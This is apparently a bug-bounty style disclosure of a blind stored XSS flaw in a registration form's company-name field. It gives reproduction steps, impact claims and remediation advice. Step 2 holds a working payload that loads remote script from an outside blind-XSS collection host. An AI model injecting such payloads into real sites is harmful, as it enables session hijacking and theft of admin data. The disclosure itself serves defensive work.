
## Title
Blind Cross-Site Scripting (XSS) in "Company Name" field in the registration page

## Summary
I found a blind cross-site scripting vulnerability in "companay name" field in the registration page. There is no input validation implemented on this parameter. Attacker can inject arbitrary javascript code which gets stored in the application. Any user who acess this endpoint, the injected payload will be retrived from server and gets executed in user browser. 


## Affected URL
https://kzlabs.com/63.php?view=registerp


## Steps to Reproduce
1. Open the following URL in a browser https://kzlabs.com/63.php?view=register

2. Fill the registration form . Under company name field enter below payload
'"><script src=https://xss.report/c/sk404></script>

3. Login to the application using the credentials you created.

4. You will not see any alert box getting triggered.

5. Since it is a Blind XSS, you can see the output in xss.report portal. The injected payload has captured snapshot from admin portal.


## Proof of Concept Request

<img width="2972" height="1676" alt="image" src="https://github.com/user-attachments/assets/e788a8e3-0ca6-4ca5-ba50-8a8ec1381fa1" />

<img width="2940" height="1650" alt="image" src="https://github.com/user-attachments/assets/fe722f16-8215-4673-9378-52fd52c774b0" />



## Impact
- It allows attackers to hijack user session
- It potentially leads to full account takeover
- It allows to perform  unauthorized actions within the vulnerable application
- It allows attacker to exfiltrate sensitive data


## Remediation
- User supplied input should be validated at server level.
- Use a security encoding library to encode all parameters
- Use whitelisting instead of blacklist for special charecters
- Use HTTPOnly flag. This will prevent client-side scripts from accessing cookies
- Use CSP header and avoid using eval, unsafe-inline etc directives in CSP.
- Use strong WAF like cloudflare to block malicious payloads.
